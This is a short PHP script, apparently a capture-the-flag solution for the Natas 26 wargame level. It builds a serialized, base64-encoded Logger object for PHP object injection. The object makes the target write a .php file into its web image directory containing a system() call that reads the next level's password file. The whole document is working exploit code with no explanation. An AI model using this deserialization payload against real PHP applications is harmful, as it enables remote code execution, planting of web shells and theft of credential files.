<?php

    class Logger{
        private $logFile="/var/www/natas/natas26/img/8acs2tfhknn8skubn5gl5vmlki.php";
        private $initMsg;
        private $exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";


    }


$myobj=new Logger();

$exploit = base64_encode (serialize ($myobj));


print_r(serialize($myobj));

echo "\n\n\n\n\n";


print_r ($exploit);

?>